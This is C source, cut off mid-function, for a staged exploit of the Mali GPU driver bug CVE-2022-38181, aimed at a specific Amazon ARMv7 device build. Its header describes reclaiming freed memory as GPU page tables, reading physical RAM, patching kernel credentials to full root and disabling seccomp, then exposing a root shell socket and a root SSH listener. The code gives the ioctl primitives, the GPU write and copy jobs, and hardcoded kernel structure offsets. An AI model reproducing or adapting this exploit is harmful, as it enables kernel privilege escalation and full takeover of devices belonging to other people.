/*
 * Staged CVE-2022-38181 harness for Ginza's ARMv7 Mali r39p0 driver.
 *
 * The default smoke mode validates the exact allocation, commit, query, and
 * alias operations used by the reclaim chain. It does not mark memory
 * evictable, create pressure, access a stale object, or edit a page table.
 *
 * Observe mode performs eviction while replacement regions are allocated, but
 * exits without submitting the stale JIT_FREE operation.
 *
 * Reclaim mode performs the vulnerable eviction and replacement sequence,
 * then looks for read-only evidence that released backing became a GPU page
 * table. It never edits a page table or targets kernel memory. A successful
 * reclaim remains paused because tearing down the cross-owned backing can
 * panic this driver.
 *
 * Pte-test mode temporarily redirects one second-context GPU mapping to a
 * different page owned by that same context, verifies the redirect with a
 * GPU WRITE_VALUE job, restores the original entry, and remains paused. It
 * never maps or writes system memory.
 *
 * Pte-read mode performs the same owned-memory redirect, copies the complete
 * redirected 4 KiB page with a native G52 compute job, restores the original
 * entry, and validates both the source and output pages before pausing.
 *
 * Phys-scan mode maps the reclaimed page-table pages to their deferred GPU
 * ranges, then uses untouched virtual addresses to read the first 32 MiB of
 * Ginza's live Linux RAM into a shell-owned file. Every temporary ATE is
 * restored before the next page, and target physical memory is never written.
 *
 * Root-server mode first creates a process-private credential, resolves its
 * own task from the live task list, validates the exact credential and
 * SELinux layouts recovered from this build, and sets only that credential's
 * IDs and capability masks. Its SELinux domain remains the launching domain.
 * Each temporary GPU ATE is restored immediately. The rooted process then
 * serves a fully capable interactive shell over the abstract Unix socket
 * "ginza-root" until reboot. When GINZA_DROPBEAR names the packaged SSH
 * server, it also starts a key-only root SSH listener on TCP port 2222.
 */

#define _GNU_SOURCE

#include <errno.h>
#include <fcntl.h>
#include <inttypes.h>
#include <linux/capability.h>
#include <poll.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdatomic.h>
#include <stdbool.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/un.h>
#include <sys/utsname.h>
#include <sys/wait.h>
#include <unistd.h>

#include "ginza_mali_r39.h"

#define SMOKE_PAGES 4U
#define SMOKE_WORD 0x47494e5aU
#define ALIAS_WORD 0x4d414c49U
#define GPU_WORD 0x11223344U
#define MALI_JOB_TYPE_WRITE_VALUE 2U
#define MALI_WRITE_VALUE_TYPE_IMMEDIATE_32 6U
#define MALI_WRITE_VALUE_TYPE_IMMEDIATE_64 7U
#define MALI_JOB_TYPE_COMPUTE 4U
#define BASE_JD_EVENT_DONE 1U

#define G52_COPY_RSD_OFFSET 0x000U
#define G52_COPY_TLS_OFFSET 0x040U
#define G52_COPY_PUSH_OFFSET 0x080U
#define G52_COPY_JOB_OFFSET 0x100U
#define G52_COPY_SHADER_WORDS 56U
#define G52_COPY_JOB_WORDS 48U

/* Generated for Bifrost arch 7 from a 4 KiB OpenCL copy kernel. */
static const uint32_t g52_copy_shader[G52_COPY_SHADER_WORDS] = {
    0xc0004329U, 0x8b88c043U, 0xc0076591U, 0x31400848U, 0xc0004321U,
    0x838ac00bU, 0x0c1f6591U, 0x58c04002U, 0x10828301U, 0x80cb1828U,
    0xe0371817U, 0xb401c604U, 0x20c38363U, 0x80cb1828U, 0x0006ca13U,
    0x58c2c180U, 0x20000007U, 0x80cb1858U, 0xe03039e3U, 0xac01c607U,
    0x00000076U, 0x000001d0U, 0x00000000U, 0x00000000U, 0x0000842dU,
    0x80cb1840U, 0x00071813U, 0x01800040U, 0x10008425U, 0x80cb1828U,
    0x0c271817U, 0x58c14002U, 0x100000abU, 0x80cb1858U, 0xe037181fU,
    0x0001b284U, 0x00000053U, 0x80cb1858U, 0x0000b9e3U, 0x00000000U,
    0x00000000U, 0x00000000U, 0x00000000U, 0x00000000U, 0x00000000U,
    0x00000000U, 0x00000000U, 0x00000000U, 0x00000000U, 0x00000000U,
    0x00000000U, 0x00000000U, 0x00000000U, 0x00000000U, 0x00000000U,
    0x00000000U,
};

#define RECLAIM_JIT_ID 1U
#define RECLAIM_JIT_VA_PAGES 0x1000U
#define RECLAIM_VICTIM_PAGES RECLAIM_JIT_VA_PAGES
#define RECLAIM_SPRAY_PAGES 25U
#define RECLAIM_STORM_REGIONS 16384U
#define RECLAIM_STORM_THREADS 4U
#define RECLAIM_TRAILING_REGIONS 1024U
#define RECLAIM_CANDIDATES_BEFORE 1024U
#define RECLAIM_CANDIDATES_AFTER 1024U
#define RECLAIM_MAX_CANDIDATES                                                 \
  (RECLAIM_CANDIDATES_BEFORE + RECLAIM_CANDIDATES_AFTER)
#define RECLAIM_ALIAS_CHUNK_REGIONS 1U
#define RECLAIM_MAX_ALIAS_CHUNKS                                               \
  ((RECLAIM_MAX_CANDIDATES + RECLAIM_ALIAS_CHUNK_REGIONS - 1U) /               \
   RECLAIM_ALIAS_CHUNK_REGIONS)
#define RECLAIM_RESERVE_PAGES 512U
#define RECLAIM_RESERVE_REGIONS 24U
#define RECLAIM_POOL_DRAIN_PAGES 256U
#define RECLAIM_POOL_DRAIN_REGIONS 64U
#define RECLAIM_PRESSURE_CHUNK_MB 8U
#define RECLAIM_DEFAULT_PRESSURE_MB 640U
#define RECLAIM_MIN_PRESSURE_MB 128U
#define RECLAIM_MAX_PRESSURE_MB 1024U
#define GPU_L3_ATE_RW_MASK 0x443ULL
#define GPU_L3_ENTRY_TYPE_MASK 0x3ULL
#define GPU_L3_ENTRY_VALID 0x3ULL
#define GPU_L3_ATE_PHYSICAL_MASK UINT64_C(0x003ffffffffff000)
#define PTE_SELFTEST_MAX_CANDIDATES RECLAIM_SPRAY_PAGES
#define PTE_SELFTEST_MAX_TABLES (RECLAIM_RESERVE_REGIONS + 1U)
#define PTE_SELFTEST_WORD_A 0x50544541U
#define PTE_SELFTEST_WORD_B 0x50544542U
#define PTE_SELFTEST_GPU_WORD 0x52454449U
#define PTE_READTEST_VALUE_A UINT64_C(0x5054452d52454144)
#define PTE_READTEST_VALUE_B UINT64_C(0x4750552d52454144)
#define PTE_READTEST_SENTINEL UINT64_C(0x4e4f542d52454144)
#define PTE_READTEST_STEP UINT64_C(0x9e3779b97f4a7c15)
#define PTE_SCAN_ENTRY_START 64U
#define PHYS_SCAN_START UINT64_C(0x26000000)
#define PHYS_SCAN_PAGES 8192U
#define PHYS_SCAN_PATH "/data/local/tmp/ginza-phys-26000000.bin"

#define GINZA_PAGE_OFFSET UINT32_C(0xc0000000)
#define GINZA_PHYS_OFFSET UINT64_C(0x26000000)
#define GINZA_LOWMEM_END UINT64_C(0x42a00000)
#define GINZA_INIT_TASK UINT32_C(0xc1e10680)
#define GINZA_INIT_CRED UINT32_C(0xc1e19170)
#define GINZA_SELINUX_STATE UINT32_C(0xc210b9d8)
#define GINZA_TASK_SIZE 2112U
#define GINZA_TASK_STACK_OFFSET 4U
#define GINZA_TASK_TASKS_OFFSET 872U
#define GINZA_TASK_TASKS_PREV_OFFSET 876U
#define GINZA_TASK_PID_OFFSET 1040U
#define GINZA_TASK_TGID_OFFSET 1044U
#define GINZA_TASK_REAL_CRED_OFFSET 1316U
#define GINZA_TASK_CRED_OFFSET 1320U
#define GINZA_TASK_COMM_OFFSET 1328U
#define GINZA_TASK_SECCOMP_OFFSET 1440U
#define GINZA_SECCOMP_MODE_OFFSET 0U
#define GINZA_SECCOMP_FILTER_COUNT_OFFSET 4U
#define GINZA_SECCOMP_FILTER_OFFSET 8U
#define GINZA_SECCOMP_FILTER_MODE 2U
#define GINZA_THREAD_SIZE 8192U
#define GINZA_TIF_SECCOMP_MASK (UINT32_C(1) << 23)
#define GINZA_CRED_SIZE 128U
#define GINZA_CRED_UID_OFFSET 4U
#define GINZA_CRED_GID_OFFSET 8U
#define GINZA_CRED_EUID_OFFSET 20U
#define GINZA_CRED_EGID_OFFSET 24U
#define GINZA_CRED_FSUID_OFFSET 28U
#define GINZA_CRED_FSGID_OFFSET 32U
#define GINZA_CRED_CAP_PERMITTED_OFFSET 48U
#define GINZA_CRED_CAP_EFFECTIVE_OFFSET 56U
#define GINZA_CRED_CAP_BSET_OFFSET 64U
#define GINZA_CRED_SECURITY_OFFSET 100U
#define GINZA_CAP_FULL UINT64_C(0x000001ffffffffff)
#define GINZA_CAP_LAST 40U
#define ROOT_TASK_NAME "ginza-root"
#define ROOT_SERVER_TASK_NAME "ginza-server"
#define ROOT_SOCKET_NAME "ginza-root"
#define ROOT_SSH_EXECUTABLE_ENV "GINZA_DROPBEAR"
#define ROOT_STATE_DIRECTORY_ENV "GINZA_STATE_DIR"
#define ROOT_DEFAULT_SSH_DIRECTORY "/data/local/tmp/ginza-ssh"
#define ROOT_DEFAULT_PROOF_PATH "/data/local/tmp/ginza-root-proof.txt"
#define ROOT_PATH_MAX 512U
#define ROOT_SSH_PORT 2222U
#define ROOT_SSH_PORT_TEXT "2222"
#define ROOT_MAX_TASKS 4096U
#define ROOT_TASK_SEARCH_ATTEMPTS 64U
#define ROOT_PHYS_CACHE_PAGES 4096U
#define ROOT_CRED_PATCH_COUNT 14U
#define ROOT_SECCOMP_PATCH_COUNT 3U
#define ROOT_CACHE_EVICTION_BYTES (32U * 1024U * 1024U)
#define ROOT_CACHE_LINE_BYTES 64U
#define ROOT_CACHE_EVICTION_ATTEMPTS 16U
#define TARGET_PROPERTY_MAX 256U
#define TARGET_DEVICE "ginza"
#define TARGET_VARIANT "ginza-hh"
#define TARGET_BUILD_FINGERPRINT                                               \
  "Amazon/ginza/ginza:11/RS8180.3729N/0032280318340:user/amz-p,release-keys"
#define TARGET_BOOT_FINGERPRINT                                                \
  "Amazon/ginza/ginza:11/RS8180.3729N/0032280318208:user/amz-p,release-keys"
#define TARGET_INCREMENTAL "0032280318340"
#define TARGET_KERNEL_RELEASE "5.15.180-android13-8-g0d8b47e36fe4-dirty"
#define TARGET_MACHINE "armv7l"

struct mali_context {
  int fd;
  void *tracking_page;
};

struct mali_region {
  uint64_t gpu_va;
  uint64_t pages;
  void *cpu;
};

struct reserved_region {
  uint64_t cookie;
  uint64_t gpu_va;
  uint64_t pages;
  void *cpu;
};

struct pressure_set {
  void *chunks[RECLAIM_MAX_PRESSURE_MB / RECLAIM_PRESSURE_CHUNK_MB];
  size_t count;
};

struct spray_storm {
  struct mali_context *context;
  struct mali_region *regions;
  atomic_uint next;
  atomic_uint completed;
  atomic_uint failures;
  atomic_bool stop;
};

struct spray_worker {
  struct spray_storm *storm;
  unsigned int cpu;
};

struct page_table_candidate {
  volatile const uint64_t *entries;
  uint64_t alias_gpu_va;
  size_t page_index;
};

struct mapped_page_table {
  const struct page_table_candidate *candidate;
  uint64_t table_key;
  bool excluded_entries[GINZA_MALI_PAGE_SIZE / sizeof(uint64_t)];
};

struct physical_page_cache_entry {
  uint64_t physical_address;
  unsigned char data[GINZA_MALI_PAGE_SIZE];
};

struct physical_accessor {
  struct mali_context *primary;
  struct mali_context *secondary;
  const struct mali_region *primary_job;
  const struct mali_region *secondary_job;
  const struct mali_region *secondary_control;
  const struct mali_region *secondary_output;
  const struct reserved_region *reserved;
  struct mapped_page_table mapped[RECLAIM_SPRAY_PAGES];
  size_t mapped_count;
  size_t next_table;
  size_t next_entry;
  unsigned int operation;
  struct physical_page_cache_entry *cache;
  size_t cache_count;
  size_t cache_capacity;
};

struct physical_patch32 {
  uint16_t offset;
  uint32_t before;
  uint32_t after;
};

struct root_paths {
  char directory[ROOT_PATH_MAX];
  char authorized_keys[ROOT_PATH_MAX];
  char host_key[ROOT_PATH_MAX];
  char log[ROOT_PATH_MAX];
  char pid_file[ROOT_PATH_MAX];
  char proof[ROOT_PATH_MAX];
};

static bool isolate_process_credential(void);

static _Noreturn void sleep_forever(void) {
  for (;;)
    usleep(500000);
}

static _Noreturn void hold_unsafe_gpu_state(const char *reason) {
  fprintf(stderr, "[-] %s; holding GPU contexts open until reboot\n", reason);
  sleep_forever();
}

static void fail_errno(const char *operation) {
  fprintf(stderr, "[-] %s: %s\n", operation, strerror(errno));
  exit(EXIT_FAILURE);
}

static void fail_pthread(const char *operation, int error) {
  fprintf(stderr, "[-] %s: %s\n", operation, strerror(error));
  exit(EXIT_FAILURE);
}

static void setup_context(struct mali_context *context) {
  struct kbase_ioctl_version_check version = {
      .major = GINZA_KBASE_API_MAJOR,
      .minor = GINZA_KBASE_API_MINOR,
  };
  struct kbase_ioctl_set_flags flags = {0};

  memset(context, 0, sizeof(*context));
  context->fd = open(GINZA_MALI_DEVICE, O_RDWR | O_CLOEXEC);
  if (context->fd < 0)
    fail_errno("open /dev/mali0");

  if (ioctl(context->fd, KBASE_IOCTL_VERSION_CHECK, &version) < 0)
    fail_errno("KBASE_IOCTL_VERSION_CHECK");
  if (version.major != GINZA_KBASE_API_MAJOR ||
      version.minor != GINZA_KBASE_API_MINOR) {
    fprintf(stderr, "[-] unsupported kbase API %u.%u\n", version.major,
            version.minor);
    exit(EXIT_FAILURE);
  }

  if (ioctl(context->fd, KBASE_IOCTL_SET_FLAGS, &flags) < 0)
    fail_errno("KBASE_IOCTL_SET_FLAGS");

  context->tracking_page =
      mmap(NULL, GINZA_MALI_PAGE_SIZE, PROT_NONE, MAP_SHARED, context->fd,
           BASE_MEM_MAP_TRACKING_HANDLE);
  if (context->tracking_page == MAP_FAILED)
    fail_errno("tracking-page mmap");

  printf("[+] kbase context ready: API %u.%u\n", version.major, version.minor);
}

static void close_context(struct mali_context *context) {
  if (context->tracking_page && context->tracking_page != MAP_FAILED)
    munmap(context->tracking_page, GINZA_MALI_PAGE_SIZE);
  if (context->fd >= 0)
    close(context->fd);
  context->fd = -1;
}

static uint32_t wait_for_event(struct mali_context *context,
                               uint8_t atom_number, const char *operation) {
  struct base_jd_event_v2 event;
  struct pollfd descriptor = {
      .fd = context->fd,
      .events = POLLIN,
  };
  int poll_result;
  ssize_t bytes_read;

  poll_result = poll(&descriptor, 1, 3000);
  if (poll_result < 0)
    fail_errno(operation);
  if (poll_result == 0) {
    fprintf(stderr, "[-] %s timed out\n", operation);
    exit(EXIT_FAILURE);
  }

  bytes_read = read(context->fd, &event, sizeof(event));
  if (bytes_read != (ssize_t)sizeof(event)) {
    fprintf(stderr, "[-] short %s event read: %zd\n", operation, bytes_read);
    exit(EXIT_FAILURE);
  }
  if (event.atom_number != atom_number) {
    fprintf(stderr, "[-] %s returned atom %u, expected atom %u\n", operation,
            event.atom_number, atom_number);
    exit(EXIT_FAILURE);
  }
  return event.event_code;
}

static void initialize_jit(struct mali_context *context) {
  struct kbase_ioctl_mem_jit_init request = {
      .va_pages = RECLAIM_JIT_VA_PAGES,
      .max_allocations = 8,
      .trim_level = 100,
      .group_id = 0,
      .phys_pages = RECLAIM_JIT_VA_PAGES,
  };

  if (ioctl(context->fd, KBASE_IOCTL_MEM_JIT_INIT, &request) < 0)
    fail_errno("KBASE_IOCTL_MEM_JIT_INIT");
}

static struct mali_region allocate_region(struct mali_context *context,
                                          uint64_t pages, uint64_t commit_pages,
                                          uint64_t group_id) {
  const uint64_t flags = BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_CPU_WR |
                         BASE_MEM_PROT_GPU_RD | BASE_MEM_PROT_GPU_WR |
                         BASE_MEM_GROUP_ID(group_id);
  union kbase_ioctl_mem_alloc request;
  struct mali_region region;

  memset(&request, 0, sizeof(request));
  request.in.va_pages = pages;
  request.in.commit_pages = commit_pages;
  request.in.flags = flags;
  if (ioctl(context->fd, KBASE_IOCTL_MEM_ALLOC, &request) < 0)
    fail_errno("KBASE_IOCTL_MEM_ALLOC");

  region.gpu_va = request.out.gpu_va;
  region.pages = pages;
  region.cpu = mmap(NULL, pages * GINZA_MALI_PAGE_SIZE, PROT_READ | PROT_WRITE,
                    MAP_SHARED, context->fd, (off_t)region.gpu_va);
  if (region.cpu == MAP_FAILED)
    fail_errno("GPU allocation mmap");

  return region;
}

static struct mali_region
allocate_executable_region(struct mali_context *context, uint64_t pages) {
  union kbase_ioctl_mem_alloc request;
  struct mali_region region;

  memset(&request, 0, sizeof(request));
  request.in.va_pages = pages;
  request.in.commit_pages = pages;
  request.in.flags = BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_CPU_WR |
                     BASE_MEM_PROT_GPU_RD | BASE_MEM_PROT_GPU_EX;
  if (ioctl(context->fd, KBASE_IOCTL_MEM_ALLOC, &request) < 0)
    fail_errno("executable KBASE_IOCTL_MEM_ALLOC");

  region.gpu_va = request.out.gpu_va;
  region.pages = pages;
  region.cpu = mmap(NULL, pages * GINZA_MALI_PAGE_SIZE, PROT_READ | PROT_WRITE,
                    MAP_SHARED, context->fd, (off_t)region.gpu_va);
  if (region.cpu == MAP_FAILED)
    fail_errno("GPU allocation mmap");

  return region;
}

static int try_allocate_unmapped_region(struct mali_context *context,
                                        uint64_t pages,
                                        struct mali_region *region) {
  union kbase_ioctl_mem_alloc request;

  memset(&request, 0, sizeof(request));
  request.in.va_pages = pages;
  request.in.flags = BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_CPU_WR |
                     BASE_MEM_PROT_GPU_RD | BASE_MEM_PROT_GPU_WR;
  if (ioctl(context->fd, KBASE_IOCTL_MEM_ALLOC, &request) < 0)
    return -1;

  region->gpu_va = request.out.gpu_va;
  region->pages = pages;
  region->cpu = NULL;
  return 0;
}

static int try_query_region(struct mali_context *context, uint64_t gpu_va,
                            uint64_t query_type, uint64_t *value) {
  union kbase_ioctl_mem_query query;

  memset(&query, 0, sizeof(query));
  query.in.gpu_addr = gpu_va;
  query.in.query = query_type;
  if (ioctl(context->fd, KBASE_IOCTL_MEM_QUERY, &query) < 0)
    return -1;
  *value = query.out.value;
  return 0;
}

static uint64_t query_region(struct mali_context *context, uint64_t gpu_va,
                             uint64_t query_type) {
  uint64_t value;

  if (try_query_region(context, gpu_va, query_type, &value) < 0)
    fail_errno("KBASE_IOCTL_MEM_QUERY");
  return value;
}

static void commit_region(struct mali_context *context, uint64_t gpu_va,
                          uint64_t pages) {
  struct kbase_ioctl_mem_commit commit = {
      .gpu_addr = gpu_va,
      .pages = pages,
  };

  if (ioctl(context->fd, KBASE_IOCTL_MEM_COMMIT, &commit) < 0)
    fail_errno("KBASE_IOCTL_MEM_COMMIT");
}

static struct mali_region alias_region(struct mali_context *context,
                                       const struct mali_region *source) {
  struct base_mem_aliasing_info info;
  union kbase_ioctl_mem_alias request;
  struct mali_region alias;

  memset(&info, 0, sizeof(info));
  info.handle.basep.handle = source->gpu_va;
  info.length = source->pages;

  memset(&request, 0, sizeof(request));
  request.in.flags = BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_CPU_WR |
                     BASE_MEM_PROT_GPU_RD | BASE_MEM_PROT_GPU_WR;
  request.in.stride = source->pages;
  request.in.nents = 1;
  request.in.aliasing_info = (uintptr_t)&info;
  if (ioctl(context->fd, KBASE_IOCTL_MEM_ALIAS, &request) < 0)
    fail_errno("KBASE_IOCTL_MEM_ALIAS");

  alias.gpu_va = request.out.gpu_va;
  alias.pages = request.out.va_pages;
  alias.cpu = mmap(NULL, alias.pages * GINZA_MALI_PAGE_SIZE, PROT_READ,
                   MAP_SHARED, context->fd, (off_t)alias.gpu_va);
  if (alias.cpu == MAP_FAILED)
    fail_errno("alias mmap");

  return alias;
}

static struct mali_region alias_regions(struct mali_context *context,
                                        const struct mali_region *sources,
                                        size_t source_count) {
  struct base_mem_aliasing_info *info;
  union kbase_ioctl_mem_alias request;
  struct mali_region alias;
  size_t index;

  if (source_count == 0 || source_count > RECLAIM_MAX_CANDIDATES) {
    fprintf(stderr, "[-] invalid alias source count: %zu\n", source_count);
    exit(EXIT_FAILURE);
  }
  info = calloc(source_count, sizeof(*info));
  if (!info)
    fail_errno("allocate alias metadata");
  for (index = 0; index < source_count; index++) {
    info[index].handle.basep.handle = sources[index].gpu_va;
    info[index].length = sources[index].pages;
  }

  memset(&request, 0, sizeof(request));
  request.in.flags = BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_CPU_WR |
                     BASE_MEM_PROT_GPU_RD | BASE_MEM_PROT_GPU_WR;
  request.in.stride = RECLAIM_SPRAY_PAGES;
  request.in.nents = source_count;
  request.in.aliasing_info = (uintptr_t)info;
  if (ioctl(context->fd, KBASE_IOCTL_MEM_ALIAS, &request) < 0)
    fail_errno("multi-region KBASE_IOCTL_MEM_ALIAS");
  free(info);

  alias.gpu_va = request.out.gpu_va;
  alias.pages = request.out.va_pages;
  alias.cpu = mmap(NULL, alias.pages * GINZA_MALI_PAGE_SIZE, PROT_READ,
                   MAP_SHARED, context->fd, (off_t)alias.gpu_va);
  if (alias.cpu == MAP_FAILED)
    fail_errno("multi-region alias mmap");
  return alias;
}

static void release_region(struct mali_context *context,
                           struct mali_region *region) {
  struct kbase_ioctl_mem_free request = {.gpu_addr = region->gpu_va};

  if (region->cpu && region->cpu != MAP_FAILED)
    munmap(region->cpu, region->pages * GINZA_MALI_PAGE_SIZE);
  region->cpu = NULL;
  if (ioctl(context->fd, KBASE_IOCTL_MEM_FREE, &request) < 0)
    fail_errno("KBASE_IOCTL_MEM_FREE");
  region->gpu_va = 0;
}

static void release_region_best_effort(struct mali_context *context,
                                       struct mali_region *region) {
  struct kbase_ioctl_mem_free request;

  if (!region->gpu_va)
    return;
  if (region->cpu && region->cpu != MAP_FAILED)
    munmap(region->cpu, region->pages * GINZA_MALI_PAGE_SIZE);
  request.gpu_addr = region->gpu_va;
  (void)ioctl(context->fd, KBASE_IOCTL_MEM_FREE, &request);
  memset(region, 0, sizeof(*region));
}

static uint32_t gpu_write_value(struct mali_context *context,
                                const struct mali_region *job_region,
                                uint64_t target, uint64_t value,
                                uint32_t value_type, uint8_t atom_number) {
  uint32_t *job = job_region->cpu;
  struct base_jd_atom_v2 atom;
  struct kbase_ioctl_job_submit submit;
  struct base_jd_event_v2 event;
  struct pollfd poll_descriptor;
  ssize_t bytes_read;
  int poll_result;

  memset(job, 0, 14U * sizeof(*job));
  job[4] = 1U | (MALI_JOB_TYPE_WRITE_VALUE << 1);
  job[8] = (uint32_t)target;
  job[9] = (uint32_t)(target >> 32);
  job[10] = value_type;
  job[12] = (uint32_t)value;
  job[13] = (uint32_t)(value >> 32);

  memset(&atom, 0, sizeof(atom));
  atom.jc = job_region->gpu_va;
  atom.atom_number = atom_number;
  atom.core_req = BASE_JD_REQ_CS;

  submit.addr = (uintptr_t)&atom;
  submit.nr_atoms = 1;
  submit.stride = sizeof(atom);
  if (ioctl(context->fd, KBASE_IOCTL_JOB_SUBMIT, &submit) < 0)
    fail_errno("WRITE_VALUE job submit");

  poll_descriptor.fd = context->fd;
  poll_descriptor.events = POLLIN;
  poll_descriptor.revents = 0;
  poll_result = poll(&poll_descriptor, 1, 2000);
  if (poll_result < 0)
    fail_errno("WRITE_VALUE event poll");
  if (poll_result == 0) {
    fprintf(stderr, "[-] WRITE_VALUE event timed out\n");
    exit(EXIT_FAILURE);
  }

  bytes_read = read(context->fd, &event, sizeof(event));
  if (bytes_read != (ssize_t)sizeof(event)) {
    fprintf(stderr, "[-] short WRITE_VALUE event read: %zd\n", bytes_read);
    exit(EXIT_FAILURE);
  }
  return event.event_code;
}

static uint32_t gpu_write32(struct mali_context *context,
                            const struct mali_region *job_region,
                            uint64_t target, uint32_t value,
                            uint8_t atom_number) {
  return gpu_write_value(context, job_region, target, value,
                         MALI_WRITE_VALUE_TYPE_IMMEDIATE_32, atom_number);
}

static uint32_t gpu_write64(struct mali_context *context,
                            const struct mali_region *job_region,
                            uint64_t target, uint64_t value,
                            uint8_t atom_number) {
  return gpu_write_value(context, job_region, target, value,
                         MALI_WRITE_VALUE_TYPE_IMMEDIATE_64, atom_number);
}

static void store_gpu_address(uint32_t *words, size_t word_index,
                              uint64_t gpu_address) {
  words[word_index] = (uint32_t)gpu_address;
  words[word_index + 1U] = (uint32_t)(gpu_address >> 32);
}

static void prepare_g52_copy_engine(const struct mali_region *executable,
                                    const struct mali_region *control) {
  uint32_t *rsd =
      (uint32_t *)((unsigned char *)control->cpu + G52_COPY_RSD_OFFSET);
  uint32_t *tls =
      (uint32_t *)((unsigned char *)control->cpu + G52_COPY_TLS_OFFSET);
  uint32_t *job =
      (uint32_t *)((unsigned char *)control->cpu + G52_COPY_JOB_OFFSET);

  memset(executable->cpu, 0, GINZA_MALI_PAGE_SIZE);
  memcpy(executable->cpu, g52_copy_shader, sizeof(g52_copy_shader));
  memset(control->cpu, 0, GINZA_MALI_PAGE_SIZE);

  store_gpu_address(rsd, 0, executable->gpu_va);
  rsd[4] = 0x00002000U;
  rsd[12] = 0x00029000U;

  tls[1] = 0x0000001fU;

  job[4] = 1U | (MALI_JOB_TYPE_COMPUTE << 1) | (1U << 16);
  job[8] = 0x000001ffU;
  job[9] = 0x624918c6U;
  job[10] = 0x24000000U;
  job[16] = 0x00000003U;
  store_gpu_address(job, 28, control->gpu_va + (uint64_t)G52_COPY_PUSH_OFFSET);
  store_gpu_address(job, 30, control->gpu_va + (uint64_t)G52_COPY_RSD_OFFSET);
  store_gpu_address(job, 44, control->gpu_va + (uint64_t)G52_COPY_TLS_OFFSET);
  __sync_synchronize();
}

static uint32_t gpu_copy_page(struct mali_context *context,
                              const struct mali_region *control,
                              uint64_t source_gpu_va,
                              uint64_t destination_gpu_va,
                              uint8_t atom_number) {
  uint32_t *push =
      (uint32_t *)((unsigned char *)control->cpu + G52_COPY_PUSH_OFFSET);
  uint32_t *job =
      (uint32_t *)((unsigned char *)control->cpu + G52_COPY_JOB_OFFSET);
  struct base_jd_atom_v2 atom;
  struct kbase_ioctl_job_submit submit;

  memset(push, 0, 40U);
  push[0] = 8U;
  push[1] = 1U;
  push[2] = 1U;
  store_gpu_address(push, 6, source_gpu_va);
  store_gpu_address(push, 8, destination_gpu_va);

  memset(job, 0, 8U * sizeof(*job));
  job[4] = 1U | (MALI_JOB_TYPE_COMPUTE << 1) | (1U << 16);
  __sync_synchronize();

  memset(&atom, 0, sizeof(atom));
  atom.jc = control->gpu_va + G52_COPY_JOB_OFFSET;
  atom.atom_number = atom_number;
  atom.core_req = BASE_JD_REQ_CS;
  submit.addr = (uintptr_t)&atom;
  submit.nr_atoms = 1;
  submit.stride = sizeof(atom);
  if (ioctl(context->fd, KBASE_IOCTL_JOB_SUBMIT, &submit) < 0)
    fail_errno("G52 copy job submit");

  return wait_for_event(context, atom_number, "G52 copy job");
}

static uint64_t jit_allocate(struct mali_context *context,
                             const struct mali_region *scratch,
                             uint64_t va_pages, uint64_t commit_pages,
                             uint8_t id, uint8_t bin_id,
                             uint8_t max_allocations, uint8_t atom_number) {
  struct base_jit_alloc_info info;
  struct base_jd_atom_v2 atom;
  struct kbase_ioctl_job_submit submit;
  volatile uint64_t *result = scratch->cpu;
  uint32_t event_code;

  *result = 0;
  memset(&info, 0, sizeof(info));
  info.gpu_alloc_addr = scratch->gpu_va;
  info.va_pages = va_pages;
  info.commit_pages = commit_pages;
  info.extension = va_pages;
  info.id = id;
  info.bin_id = bin_id;
  info.max_allocations = max_allocations;

  memset(&atom, 0, sizeof(atom));
  atom.jc = (uintptr_t)&info;
  atom.nr_extres = 1;
  atom.atom_number = atom_number;
  atom.core_req = BASE_JD_REQ_SOFT_JIT_ALLOC;

  submit.addr = (uintptr_t)&atom;
  submit.nr_atoms = 1;
  submit.stride = sizeof(atom);
  if (ioctl(context->fd, KBASE_IOCTL_JOB_SUBMIT, &submit) < 0)
    fail_errno("JIT_ALLOC job submit");

  event_code = wait_for_event(context, atom_number, "JIT_ALLOC");
  if (event_code != BASE_JD_EVENT_DONE) {
    fprintf(stderr, "[-] JIT_ALLOC event code: 0x%08" PRIx32 "\n", event_code);
    exit(EXIT_FAILURE);
  }
  if (!*result || (*result & (GINZA_MALI_PAGE_SIZE - 1U))) {
    fprintf(stderr, "[-] invalid JIT allocation address: 0x%016" PRIx64 "\n",
            *result);
    exit(EXIT_FAILURE);
  }
  return *result;
}

static void jit_free(struct mali_context *context, uint8_t id,
                     uint8_t atom_number) {
  struct base_jd_atom_v2 atom;
  struct kbase_ioctl_job_submit submit;
  uint32_t event_code;

  memset(&atom, 0, sizeof(atom));
  atom.jc = (uintptr_t)&id;
  atom.nr_extres = 1;
  atom.atom_number = atom_number;
  atom.core_req = BASE_JD_REQ_SOFT_JIT_FREE;

  submit.addr = (uintptr_t)&atom;
  submit.nr_atoms = 1;
  submit.stride = sizeof(atom);
  if (ioctl(context->fd, KBASE_IOCTL_JOB_SUBMIT, &submit) < 0)
    fail_errno("JIT_FREE job submit");

  event_code = wait_for_event(context, atom_number, "JIT_FREE");
  if (event_code != BASE_JD_EVENT_DONE) {
    fprintf(stderr, "[-] JIT_FREE event code: 0x%08" PRIx32 "\n", event_code);
    exit(EXIT_FAILURE);
  }
}

static int change_dont_need(struct mali_context *context, uint64_t gpu_va,
                            bool dont_need) {
  struct kbase_ioctl_mem_flags_change request = {
      .gpu_va = gpu_va,
      .flags = dont_need ? BASE_MEM_DONT_NEED : 0,
      .mask = BASE_MEM_DONT_NEED,
  };

  return ioctl(context->fd, KBASE_IOCTL_MEM_FLAGS_CHANGE, &request);
}

static void reserve_same_va_regions(struct mali_context *context,
                                    struct reserved_region *regions) {
  size_t index;

  for (index = 0; index < RECLAIM_RESERVE_REGIONS; index++) {
    union kbase_ioctl_mem_alloc request;

    memset(&request, 0, sizeof(request));
    request.in.va_pages = RECLAIM_RESERVE_PAGES;
    request.in.commit_pages = RECLAIM_RESERVE_PAGES;
    request.in.flags = BASE_MEM_SAME_VA | BASE_MEM_PROT_CPU_RD |
                       BASE_MEM_PROT_CPU_WR | BASE_MEM_PROT_GPU_RD |
                       BASE_MEM_PROT_GPU_WR;
    if (ioctl(context->fd, KBASE_IOCTL_MEM_ALLOC, &request) < 0)
